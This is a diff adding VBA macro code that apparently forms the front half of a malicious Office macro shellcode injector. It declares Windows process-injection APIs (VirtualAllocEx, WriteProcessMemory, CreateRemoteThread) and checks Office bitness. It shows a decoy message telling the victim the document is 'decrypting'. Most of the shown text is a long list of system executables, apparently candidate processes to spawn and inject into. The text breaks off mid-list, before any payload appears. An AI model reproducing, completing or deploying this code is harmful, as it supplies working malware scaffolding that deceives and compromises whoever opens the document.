@@ -1,0 +1,1178 @@
+Private Const PROCESS_ALL_ACCESS = &H1F0FFF
+Private Const MEM_COMMIT = &H1000
+Private Const MEM_RELEASE = &H8000
+Private Const PAGE_READWRITE = &H40
+Private Const HKEY_LOCAL_MACHINE = &H80000002
+Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9
+#If VBA7 Then 'x64 office
+Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
+Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare PtrSafe Function VirtualFreeEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
+Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
+Private Declare PtrSafe Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
+Private Declare PtrSafe Function GetCurrentProcess Lib "kernel32" () As LongPtr
+Private Declare PtrSafe Function IsWow64Process Lib "kernel32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
+Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Type SYSTEM_INFO
+wProcessorArchitecture As Integer
+wReserved As Integer
+dwPageSize As Long
+lpMinimumApplicationAddress As LongPtr
+lpMaximumApplicationAddress As LongPtr
+dwActiveProcessorMask As LongPtr
+dwNumberOrfProcessors As Long
+dwProcessorType As Long
+dwAllocationGranularity As Long
+wProcessorLevel As Integer
+wProcessorRevision As Integer
+End Type
+Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessId As Long
+dwThreadId As Long
+End Type
+Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
+End Type
+#Else
+Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
+Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function VirtualFreeEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
+Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
+Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
+Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
+Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
+Private Declare Function IsWow64Process Lib "kernel32" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
+Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Type SYSTEM_INFO
+wProcessorArchitecture As Integer
+wReserved As Integer
+dwPageSize As Long
+lpMinimumApplicationAddress As Long
+lpMaximumApplicationAddress As Long
+dwActiveProcessorMask As Long
+dwNumberOrfProcessors As Long
+dwProcessorType As Long
+dwAllocationGranularity As Long
+dwReserved As Long
+End Type
+Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessId As Long
+dwThreadId As Long
+End Type
+Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
+End Type
+#End If
+Dim inject64 As Boolean
+Public Function IsOffice64Bit() As Boolean
+Dim lpSystemInfo As SYSTEM_INFO
+Call GetSystemInfo(lpSystemInfo)
+If lpSystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then
+Call IsWow64Process(GetCurrentProcess(), IsOffice64Bit)
+IsOffice64Bit = Not IsOffice64Bit
+End If
+End Function
+Public Function IsWow64(handle As Long) As Boolean
+Call IsWow64Process(handle, meh)
+IsWow64 = Not meh
+End Function
+Public Function DieTotal()
+MsgBox "This document will begin decrypting, please allow up to 5 minutes"
+End Function
+Public Function TrailingSlash(strFolder As String) As String
+If Len(strFolder) > 0 Then
+If Right(strFolder, 1) = "\" Then
+TrailingSlash = strFolder
+Else
+TrailingSlash = strFolder & "\"
+End If
+End If
+End Function
+Public Function RecursiveDir(colFiles As Collection, strFolder As String, strFileSpec As String, bIncludeSubfolders As Boolean)
+Dim strTemp As String
+Dim colFolders As New Collection
+Dim vFolderName As Variant
+strFolder = TrailingSlash(strFolder)
+On Error Resume Next
+strTemp = Dir(strFolder & strFileSpec)
+Do While strTemp <> vbNullString
+colFiles.Add strFolder & strTemp
+strTemp = Dir
+Loop
+If bIncludeSubfolders Then
+strTemp = Dir(strFolder, vbDirectory)
+Do While strTemp <> vbNullString
+If (strTemp <> ".") And (strTemp <> "..") Then
+If (GetAttr(strFolder & strTemp) And vbDirectory) <> 0 Then
+colFolders.Add strTemp
+End If
+End If
+strTemp = Dir
+Loop
+For Each vFolderName In colFolders
+Call RecursiveDir(colFiles, strFolder & vFolderName, strFileSpec, True)
+Next vFolderName
+End If
+End Function
+Public Function getList() As String()
+Dim myList As String
+myList = ""
+myList = myList & "ping.exe /t 127.0.0.1" & ","
+myList = myList & "C:\Program Files (x86)\EMET 5.5\EMET_Agent.exe" & ","
+myList = myList & "hh.exe /?" & ","
+myList = myList & "regedit.exe" & ","
+myList = myList & "cmd.exe /K" & ","
+myList = myList & "xpsrchvw.exe" & ","
+myList = myList & "xcopy.exe * /w" & ","
+myList = myList & "wscript.exe" & ","
+myList = myList & "netstat.exe -aneft 100" & ","
+myList = myList & "netsh.exe" & ","
+myList = myList & "winver.exe" & ","
+myList = myList & "windowsanytimeupgradeui.exe" & ","
+myList = myList & "wfs.exe" & ","
+myList = myList & "waitfor.exe statusready" & ","
+myList = myList & "verifier.exe" & ","
+myList = myList & "timeout.exe -1" & ","
+myList = myList & "soundrecorder.exe" & ","
+myList = myList & "sndvol.exe" & ","
+myList = myList & "rasphone.exe" & ","
+myList = myList & "nslookup.exe" & ","
+myList = myList & "mstsc.exe" & ","
+myList = myList & "wmic.exe" & ","
+myList = myList & "C:\\windows\\system32\\speech\\speechux\\speechuxtutorial.exe" & ","
+myList = myList & "C:\Windows\SysWOW64\Ping.exe -t 127.0.0.1" & ","
+myList = myList & "wmic.exe" & ","
+myList = myList & "C:\Windows\bfsvc.exe" & ","
+myList = myList & "C:\Windows\explorer.exe" & ","
+myList = myList & "C:\Windows\fveupdate.exe" & ","
+myList = myList & "C:\Windows\HelpPane.exe" & ","
+myList = myList & "C:\Windows\hh.exe" & ","
+myList = myList & "C:\Windows\notepad.exe" & ","
+myList = myList & "C:\Windows\py.exe" & ","
+myList = myList & "C:\Windows\pyw.exe" & ","
+myList = myList & "C:\Windows\regedit.exe" & ","
+myList = myList & "C:\Windows\splwow64.exe" & ","
+myList = myList & "C:\Windows\twunk_16.exe" & ","
+myList = myList & "C:\Windows\twunk_32.exe" & ","
+myList = myList & "C:\Windows\winhlp32.exe" & ","
+myList = myList & "C:\Windows\write.exe" & ","
+myList = myList & "C:\Windows\Boot\PCAT\memtest.exe" & ","
+myList = myList & "C:\Windows\Microsoft.NET\NETFXRepair.exe" & ","
+myList = myList & "C:\Windows\Microsoft.NET\Framework\NETFXSBS10.exe" & ","
+myList = myList & "C:\Windows\servicing\TrustedInstaller.exe" & ","
+myList = myList & "C:\Windows\servicing\GC64\tzupd.exe" & ","
+myList = myList & "C:\Windows\Speech\Common\sapisvr.exe" & ","
+myList = myList & "C:\Windows\System32\AdapterTroubleshooter.exe" & ","
+myList = myList & "C:\Windows\System32\aitagent.exe" & ","
+myList = myList & "C:\Windows\System32\alg.exe" & ","
+myList = myList & "C:\Windows\System32\appidcertstorecheck.exe" & ","
+myList = myList & "C:\Windows\System32\appidpolicyconverter.exe" & ","
+myList = myList & "C:\Windows\System32\ARP.EXE" & ","
+myList = myList & "C:\Windows\System32\at.exe" & ","
+myList = myList & "C:\Windows\System32\AtBroker.exe" & ","
+myList = myList & "C:\Windows\System32\attrib.exe" & ","
+myList = myList & "C:\Windows\System32\audiodg.exe" & ","
+myList = myList & "C:\Windows\System32\auditpol.exe" & ","
+myList = myList & "C:\Windows\System32\autochk.exe" & ","
+myList = myList & "C:\Windows\System32\autoconv.exe" & ","
+myList = myList & "C:\Windows\System32\autofmt.exe" & ","
+myList = myList & "C:\Windows\System32\AxInstUI.exe" & ","
+myList = myList & "C:\Windows\System32\bcdboot.exe" & ","
+myList = myList & "C:\Windows\System32\bcdedit.exe" & ","
+myList = myList & "C:\Windows\System32\BdeUISrv.exe" & ","
+myList = myList & "C:\Windows\System32\BdeUnlockWizard.exe" & ","
+myList = myList & "C:\Windows\System32\bitsadmin.exe" & ","
+myList = myList & "C:\Windows\System32\bootcfg.exe" & ","
+myList = myList & "C:\Windows\System32\bridgeunattend.exe" & ","
+myList = myList & "C:\Windows\System32\bthudtask.exe" & ","
+myList = myList & "C:\Windows\System32\cacls.exe" & ","
+myList = myList & "C:\Windows\System32\calc.exe" & ","
+myList = myList & "C:\Windows\System32\CertEnrollCtrl.exe" & ","
+myList = myList & "C:\Windows\System32\certreq.exe" & ","
+myList = myList & "C:\Windows\System32\certutil.exe" & ","
+myList = myList & "C:\Windows\System32\charmap.exe" & ","
+myList = myList & "C:\Windows\System32\chkdsk.exe" & ","
+myList = myList & "C:\Windows\System32\chkntfs.exe" & ","
+myList = myList & "C:\Windows\System32\choice.exe" & ","
+myList = myList & "C:\Windows\System32\cipher.exe" & ","
+myList = myList & "C:\Windows\System32\cleanmgr.exe" & ","
+myList = myList & "C:\Windows\System32\cliconfg.exe" & ","
+myList = myList & "C:\Windows\System32\clip.exe" & ","
+myList = myList & "C:\Windows\System32\cmd.exe" & ","
+myList = myList & "C:\Windows\System32\cmdkey.exe" & ","
+myList = myList & "C:\Windows\System32\cmdl32.exe" & ","
+myList = myList & "C:\Windows\System32\cmmon32.exe" & ","
+myList = myList & "C:\Windows\System32\cmstp.exe" & ","
+myList = myList & "C:\Windows\System32\cofire.exe" & ","
+myList = myList & "C:\Windows\System32\colorcpl.exe" & ","
+myList = myList & "C:\Windows\System32\comp.exe" & ","
+myList = myList & "C:\Windows\System32\compact.exe" & ","
+myList = myList & "C:\Windows\System32\CompMgmtLauncher.exe" & ","
+myList = myList & "C:\Windows\System32\ComputerDefaults.exe" & ","
+myList = myList & "C:\Windows\System32\conhost.exe" & ","
+myList = myList & "C:\Windows\System32\consent.exe" & ","
+myList = myList & "C:\Windows\System32\control.exe" & ","
+myList = myList & "C:\Windows\System32\convert.exe" & ","
+myList = myList & "C:\Windows\System32\credwiz.exe" & ","
+myList = myList & "C:\Windows\System32\cscript.exe" & ","
+myList = myList & "C:\Windows\System32\csrss.exe" & ","
+myList = myList & "C:\Windows\System32\ctfmon.exe" & ","
+myList = myList & "C:\Windows\System32\cttune.exe" & ","
+myList = myList & "C:\Windows\System32\cttunesvr.exe" & ","
+myList = myList & "C:\Windows\System32\dccw.exe" & ","
+myList = myList & "C:\Windows\System32\dcomcnfg.exe" & ","
+myList = myList & "C:\Windows\System32\ddodiag.exe" & ","
+myList = myList & "C:\Windows\System32\Defrag.exe" & ","
+myList = myList & "C:\Windows\System32\DeviceDisplayObjectProvider.exe" & ","
+myList = myList & "C:\Windows\System32\DeviceEject.exe" & ","
+myList = myList & "C:\Windows\System32\DevicePairingWizard.exe" & ","
+myList = myList & "C:\Windows\System32\DeviceProperties.exe" & ","
+myList = myList & "C:\Windows\System32\DFDWiz.exe" & ","
+myList = myList & "C:\Windows\System32\dfrgui.exe" & ","
+myList = myList & "C:\Windows\System32\dialer.exe" & ","
+myList = myList & "C:\Windows\System32\diantz.exe" & ","
+myList = myList & "C:\Windows\System32\dinotify.exe" & ","
+myList = myList & "C:\Windows\System32\diskpart.exe" & ","
+myList = myList & "C:\Windows\System32\diskperf.exe" & ","
+myList = myList & "C:\Windows\System32\diskraid.exe" & ","
+myList = myList & "C:\Windows\System32\Dism.exe" & ","
+myList = myList & "C:\Windows\System32\dispdiag.exe" & ","
+myList = myList & "C:\Windows\System32\DisplaySwitch.exe" & ","
+myList = myList & "C:\Windows\System32\djoin.exe" & ","
+myList = myList & "C:\Windows\System32\dllhost.exe" & ","
+myList = myList & "C:\Windows\System32\dllhst3g.exe" & ","
+myList = myList & "C:\Windows\System32\dnscacheugc.exe" & ","
+myList = myList & "C:\Windows\System32\doskey.exe" & ","
+myList = myList & "C:\Windows\System32\dpapimig.exe" & ","
+myList = myList & "C:\Windows\System32\DpiScaling.exe" & ","
+myList = myList & "C:\Windows\System32\dpnsvr.exe" & ","
+myList = myList & "C:\Windows\System32\driverquery.exe" & ","
+myList = myList & "C:\Windows\System32\drvinst.exe" & ","
+myList = myList & "C:\Windows\System32\dvdplay.exe" & ","
+myList = myList & "C:\Windows\System32\dvdupgrd.exe" & ","
+myList = myList & "C:\Windows\System32\dwm.exe" & ","
+myList = myList & "C:\Windows\System32\DWWIN.EXE" & ","
+myList = myList & "C:\Windows\System32\dxdiag.exe" & ","
+myList = myList & "C:\Windows\System32\Dxpserver.exe" & ","
+myList = myList & "C:\Windows\System32\Eap3Host.exe" & ","
+myList = myList & "C:\Windows\System32\efsui.exe" & ","
+myList = myList & "C:\Windows\System32\EhStorAuthn.exe" & ","
+myList = myList & "C:\Windows\System32\esentutl.exe" & ","
+myList = myList & "C:\Windows\System32\eudcedit.exe" & ","
+myList = myList & "C:\Windows\System32\eventcreate.exe" & ","
+myList = myList & "C:\Windows\System32\eventvwr.exe" & ","
+myList = myList & "C:\Windows\System32\expand.exe" & ","
+myList = myList & "C:\Windows\System32\extrac32.exe" & ","
+myList = myList & "C:\Windows\System32\fc.exe" & ","
+myList = myList & "C:\Windows\System32\find.exe" & ","
+myList = myList & "C:\Windows\System32\findstr.exe" & ","
+myList = myList & "C:\Windows\System32\finger.exe" & ","
+myList = myList & "C:\Windows\System32\fixmapi.exe" & ","
+myList = myList & "C:\Windows\System32\fltMC.exe" & ","
+myList = myList & "C:\Windows\System32\fontview.exe" & ","
+myList = myList & "C:\Windows\System32\forfiles.exe" & ","
+myList = myList & "C:\Windows\System32\fsquirt.exe" & ","
+myList = myList & "C:\Windows\System32\fsutil.exe" & ","
+myList = myList & "C:\Windows\System32\ftp.exe" & ","
+myList = myList & "C:\Windows\System32\fvenotify.exe" & ","
+myList = myList & "C:\Windows\System32\fveprompt.exe" & ","
+myList = myList & "C:\Windows\System32\FXSCOVER.exe" & ","
+myList = myList & "C:\Windows\System32\FXSSVC.exe" & ","
+myList = myList & "C:\Windows\System32\FXSUNATD.exe" & ","
+myList = myList & "C:\Windows\System32\getmac.exe" & ","
+myList = myList & "C:\Windows\System32\GettingStarted.exe" & ","
+myList = myList & "C:\Windows\System32\gpresult.exe" & ","
+myList = myList & "C:\Windows\System32\gpupdate.exe" & ","
+myList = myList & "C:\Windows\System32\grpconv.exe" & ","
+myList = myList & "C:\Windows\System32\hdwwiz.exe" & ","
+myList = myList & "C:\Windows\System32\help.exe" & ","
+myList = myList & "C:\Windows\System32\HOSTNAME.EXE" & ","
+myList = myList & "C:\Windows\System32\icacls.exe" & ","
+myList = myList & "C:\Windows\System32\icardagt.exe" & ","
+myList = myList & "C:\Windows\System32\icsunattend.exe" & ","
+myList = myList & "C:\Windows\System32\ie4uinit.exe" & ","
+myList = myList & "C:\Windows\System32\ieUnatt.exe" & ","
+myList = myList & "C:\Windows\System32\iexpress.exe" & ","
+myList = myList & "C:\Windows\System32\InfDefaultInstall.exe" & ","
+myList = myList & "C:\Windows\System32\ipconfig.exe" & ","
+myList = myList & "C:\Windows\System32\irftp.exe" & ","
+myList = myList & "C:\Windows\System32\iscsicli.exe" & ","
+myList = myList & "C:\Windows\System32\iscsicpl.exe" & ","
+myList = myList & "C:\Windows\System32\isoburn.exe" & ","
+myList = myList & "C:\Windows\System32\klist.exe" & ","
+myList = myList & "C:\Windows\System32\ksetup.exe" & ","
+myList = myList & "C:\Windows\System32\ktmutil.exe" & ","
+myList = myList & "C:\Windows\System32\label.exe" & ","
+myList = myList & "C:\Windows\System32\LocationNotifications.exe" & ","
+myList = myList & "C:\Windows\System32\Locator.exe" & ","
+myList = myList & "C:\Windows\System32\lodctr.exe" & ","
+myList = myList & "C:\Windows\System32\logagent.exe" & ","
+myList = myList & "C:\Windows\System32\logman.exe" & ","
+myList = myList & "C:\Windows\System32\LogonUI.exe" & ","
+myList = myList & "C:\Windows\System32\lpksetup.exe" & ","
+myList = myList & "C:\Windows\System32\lpremove.exe" & ","
+myList = myList & "C:\Windows\System32\lsass.exe" & ","
+myList = myList & "C:\Windows\System32\lsm.exe" & ","
+myList = myList & "C:\Windows\System32\Magnify.exe" & ","
+myList = myList & "C:\Windows\System32\makecab.exe" & ","
+myList = myList & "C:\Windows\System32\manage-bde.exe" & ","
+myList = myList & "C:\Windows\System32\mblctr.exe" & ","
+myList = myList & "C:\Windows\System32\mcbuilder.exe" & ","
+myList = myList & "C:\Windows\System32\mctadmin.exe" & ","
+myList = myList & "C:\Windows\System32\MdRes.exe" & ","
+myList = myList & "C:\Windows\System32\MdSched.exe" & ","
+myList = myList & "C:\Windows\System32\mfpmp.exe" & ","
+myList = myList & "C:\Windows\System32\MigAutoPlay.exe" & ","
+myList = myList & "C:\Windows\System32\mmc.exe" & ","
+myList = myList & "C:\Windows\System32\mobsync.exe" & ","
+myList = myList & "C:\Windows\System32\mountvol.exe" & ","
+myList = myList & "C:\Windows\System32\mpnotify.exe" & ","
+myList = myList & "C:\Windows\System32\MpSigStub.exe" & ","
+myList = myList & "C:\Windows\System32\MRINFO.EXE" & ","
+myList = myList & "C:\Windows\System32\msconfig.exe" & ","
+myList = myList & "C:\Windows\System32\msdt.exe" & ","
+myList = myList & "C:\Windows\System32\msdtc.exe" & ","
+myList = myList & "C:\Windows\System32\msfeedssync.exe" & ","
+myList = myList & "C:\Windows\System32\mshta.exe" & ","
+myList = myList & "C:\Windows\System32\msiexec.exe" & ","
+myList = myList & "C:\Windows\System32\msinfo32.exe" & ","
+myList = myList & "C:\Windows\System32\mspaint.exe" & ","
+myList = myList & "C:\Windows\System32\msra.exe" & ","
+myList = myList & "C:\Windows\System32\mstsc.exe" & ","
+myList = myList & "C:\Windows\System32\mtstocom.exe" & ","
+myList = myList & "C:\Windows\System32\MuiUnattend.exe" & ","
+myList = myList & "C:\Windows\System32\MultiDigiMon.exe" & ","
+myList = myList & "C:\Windows\System32\NAPSTAT.EXE" & ","
+myList = myList & "C:\Windows\System32\Narrator.exe" & ","
+myList = myList & "C:\Windows\System32\nbtstat.exe" & ","
+myList = myList & "C:\Windows\System32\ndadmin.exe" & ","
+myList = myList & "C:\Windows\System32\net.exe" & ","
+myList = myList & "C:\Windows\System32\net1.exe" & ","
+myList = myList & "C:\Windows\System32\netbtugc.exe" & ","
+myList = myList & "C:\Windows\System32\netcfg.exe" & ","
+myList = myList & "C:\Windows\System32\netiougc.exe" & ","
+myList = myList & "C:\Windows\System32\Netplwiz.exe" & ","
+myList = myList & "C:\Windows\System32\netsh.exe" & ","
+myList = myList & "C:\Windows\System32\NETSTAT.EXE" & ","
+myList = myList & "C:\Windows\System32\newdev.exe" & ","
+myList = myList & "C:\Windows\System32\nltest.exe" & ","
+myList = myList & "C:\Windows\System32\notepad.exe" & ","
+myList = myList & "C:\Windows\System32\nslookup.exe" & ","
+myList = myList & "C:\Windows\System32\ntoskrnl.exe" & ","
+myList = myList & "C:\Windows\System32\ntprint.exe" & ","
+myList = myList & "C:\Windows\System32\ocsetup.exe" & ","
+myList = myList & "C:\Windows\System32\odbcad32.exe" & ","
+myList = myList & "C:\Windows\System32\odbcconf.exe" & ","
+myList = myList & "C:\Windows\System32\openfiles.exe" & ","
+myList = myList & "C:\Windows\System32\OptionalFeatures.exe" & ","
+myList = myList & "C:\Windows\System32\osk.exe" & ","
+myList = myList & "C:\Windows\System32\p2phost.exe" & ","
+myList = myList & "C:\Windows\System32\PATHPING.EXE" & ","
+myList = myList & "C:\Windows\System32\pcalua.exe" & ","
+myList = myList & "C:\Windows\System32\pcaui.exe" & ","
+myList = myList & "C:\Windows\System32\pcawrk.exe" & ","
+myList = myList & "C:\Windows\System32\pcwrun.exe" & ","
+myList = myList & "C:\Windows\System32\perfmon.exe" & ","
+myList = myList & "C:\Windows\System32\PING.EXE" & ","
+myList = myList & "C:\Windows\System32\PkgMgr.exe" & ","
+myList = myList & "C:\Windows\System32\plasrv.exe" & ","
+myList = myList & "C:\Windows\System32\PnPUnattend.exe" & ","
+myList = myList & "C:\Windows\System32\PnPutil.exe" & ","
+myList = myList & "C:\Windows\System32\poqexec.exe" & ","
+myList = myList & "C:\Windows\System32\powercfg.exe" & ","
+myList = myList & "C:\Windows\System32\PresentationHost.exe" & ","
+myList = myList & "C:\Windows\System32\prevhost.exe" & ","
+myList = myList & "C:\Windows\System32\print.exe" & ","
+myList = myList & "C:\Windows\System32\printfilterpipelinesvc.exe" & ","
+myList = myList & "C:\Windows\System32\PrintIsolationHost.exe" & ","
+myList = myList & "C:\Windows\System32\printui.exe" & ","
+myList = myList & "C:\Windows\System32\proquota.exe" & ","
+myList = myList & "C:\Windows\System32\psr.exe" & ","
+myList = myList & "C:\Windows\System32\rasautou.exe" & ","
+myList = myList & "C:\Windows\System32\rasdial.exe" & ","
+myList = myList & "C:\Windows\System32\raserver.exe" & ","
+myList = myList & "C:\Windows\System32\rasphone.exe" & ","
+myList = myList & "C:\Windows\System32\rdrleakdiag.exe" & ","
+myList = myList & "C:\Windows\System32\ReAgentc.exe" & ","
+myList = myList & "C:\Windows\System32\recdisc.exe" & ","
+myList = myList & "C:\Windows\System32\recover.exe" & ","
+myList = myList & "C:\Windows\System32\reg.exe" & ","
+myList = myList & "C:\Windows\System32\regedt32.exe" & ","
+myList = myList & "C:\Windows\System32\regini.exe" & ","
+myList = myList & "C:\Windows\System32\RegisterIEPKEYs.exe" & ","
+myList = myList & "C:\Windows\System32\regsvr32.exe" & ","
+myList = myList & "C:\Windows\System32\rekeywiz.exe" & ","
+myList = myList & "C:\Windows\System32\relog.exe" & ","
+myList = myList & "C:\Windows\System32\RelPost.exe" & ","
+myList = myList & "C:\Windows\System32\repair-bde.exe" & ","
+myList = myList & "C:\Windows\System32\replace.exe" & ","
+myList = myList & "C:\Windows\System32\resmon.exe" & ","
+myList = myList & "C:\Windows\System32\RMActivate.exe" & ","
+myList = myList & "C:\Windows\System32\RMActivate_isv.exe" & ","
+myList = myList & "C:\Windows\System32\RMActivate_ssp.exe" & ","
+myList = myList & "C:\Windows\System32\RMActivate_ssp_isv.exe" & ","
+myList = myList & "C:\Windows\System32\RmClient.exe" & ","
+myList = myList & "C:\Windows\System32\Robocopy.exe" & ","
+myList = myList & "C:\Windows\System32\ROUTE.EXE" & ","
+myList = myList & "C:\Windows\System32\RpcPing.exe" & ","
+myList = myList & "C:\Windows\System32\rrinstaller.exe" & ","
+myList = myList & "C:\Windows\System32\rstrui.exe" & ","
+myList = myList & "C:\Windows\System32\runas.exe" & ","
+myList = myList & "C:\Windows\System32\rundll32.exe" & ","
+myList = myList & "C:\Windows\System32\RunLegacyCPLElevated.exe" & ","
+myList = myList & "C:\Windows\System32\runonce.exe" & ","
+myList = myList & "C:\Windows\System32\sbunattend.exe" & ","
+myList = myList & "C:\Windows\System32\sc.exe" & ","
+myList = myList & "C:\Windows\System32\schtasks.exe" & ","
+myList = myList & "C:\Windows\System32\sdbinst.exe" & ","
+myList = myList & "C:\Windows\System32\sdchange.exe" & ","
+myList = myList & "C:\Windows\System32\sdclt.exe" & ","
+myList = myList & "C:\Windows\System32\sdiagnhost.exe" & ","
+myList = myList & "C:\Windows\System32\SearchFilterHost.exe" & ","
+myList = myList & "C:\Windows\System32\SearchIndexer.exe" & ","
+myList = myList & "C:\Windows\System32\SearchProtocolHost.exe" & ","
+myList = myList & "C:\Windows\System32\SecEdit.exe" & ","
+myList = myList & "C:\Windows\System32\secinit.exe" & ","
+myList = myList & "C:\Windows\System32\services.exe" & ","
+myList = myList & "C:\Windows\System32\sethc.exe" & ","
+myList = myList & "C:\Windows\System32\SetIEInstalledDate.exe" & ","
+myList = myList & "C:\Windows\System32\setspn.exe" & ","
+myList = myList & "C:\Windows\System32\setupcl.exe" & ","
+myList = myList & "C:\Windows\System32\setupugc.exe" & ","
+myList = myList & "C:\Windows\System32\setx.exe" & ","
+myList = myList & "C:\Windows\System32\sfc.exe" & ","
+myList = myList & "C:\Windows\System32\shrpubw.exe" & ","
+myList = myList & "C:\Windows\System32\shutdown.exe" & ","
+myList = myList & "C:\Windows\System32\sigverif.exe" & ","
+myList = myList & "C:\Windows\System32\slui.exe" & ","
+myList = myList & "C:\Windows\System32\smss.exe" & ","
+myList = myList & "C:\Windows\System32\SndVol.exe" & ","
+myList = myList & "C:\Windows\System32\snmptrap.exe" & ","
+myList = myList & "C:\Windows\System32\sort.exe" & ","
+myList = myList & "C:\Windows\System32\SoundRecorder.exe" & ","
+myList = myList & "C:\Windows\System32\spinstall.exe" & ","
+myList = myList & "C:\Windows\System32\spoolsv.exe" & ","
+myList = myList & "C:\Windows\System32\sppsvc.exe" & ","
+myList = myList & "C:\Windows\System32\spreview.exe" & ","
+myList = myList & "C:\Windows\System32\srdelayed.exe" & ","
+myList = myList & "C:\Windows\System32\subst.exe" & ","
+myList = myList & "C:\Windows\System32\svchost.exe" & ","
+myList = myList & "C:\Windows\System32\sxstrace.exe" & ","
+myList = myList & "C:\Windows\System32\SyncHost.exe" & ","
+myList = myList & "C:\Windows\System32\syskey.exe" & ","
+myList = myList & "C:\Windows\System32\systeminfo.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesAdvanced.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesComputerName.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesHardware.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesPerformance.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesProtection.exe" & ","
+myList = myList & "C:\Windows\System32\SystemPropertiesRemote.exe" & ","
+myList = myList & "C:\Windows\System32\systray.exe" & ","
+myList = myList & "C:\Windows\System32\tabcal.exe" & ","
+myList = myList & "C:\Windows\System32\takeown.exe" & ","
+myList = myList & "C:\Windows\System32\TapiUnattend.exe" & ","
+myList = myList & "C:\Windows\System32\taskeng.exe" & ","
+myList = myList & "C:\Windows\System32\taskhost.exe" & ","
+myList = myList & "C:\Windows\System32\taskkill.exe" & ","
+myList = myList & "C:\Windows\System32\tasklist.exe" & ","
+myList = myList & "C:\Windows\System32\taskmgr.exe" & ","
+myList = myList & "C:\Windows\System32\tcmsetup.exe" & ","
+myList = myList & "C:\Windows\System32\TCPSVCS.EXE" & ","
+myList = myList & "C:\Windows\System32\timeout.exe" & ","
+myList = myList & "C:\Windows\System32\TpmInit.exe" & ","
+myList = myList & "C:\Windows\System32\tracerpt.exe" & ","
+myList = myList & "C:\Windows\System32\TRACERT.EXE" & ","
+myList = myList & "C:\Windows\System32\TSTheme.exe" & ","
+myList = myList & "C:\Windows\System32\TsUsbRedirectionGroupPolicyControl.exe" & ","
+myList = myList & "C:\Windows\System32\TSWbPrxy.exe" & ","
+myList = myList & "C:\Windows\System32\TsWpfWrp.exe" & ","
+myList = myList & "C:\Windows\System32\typeperf.exe" & ","
+myList = myList & "C:\Windows\System32\tzutil.exe" & ","
+myList = myList & "C:\Windows\System32\ucsvc.exe" & ","
+myList = myList & "C:\Windows\System32\UI0Detect.exe" & ","
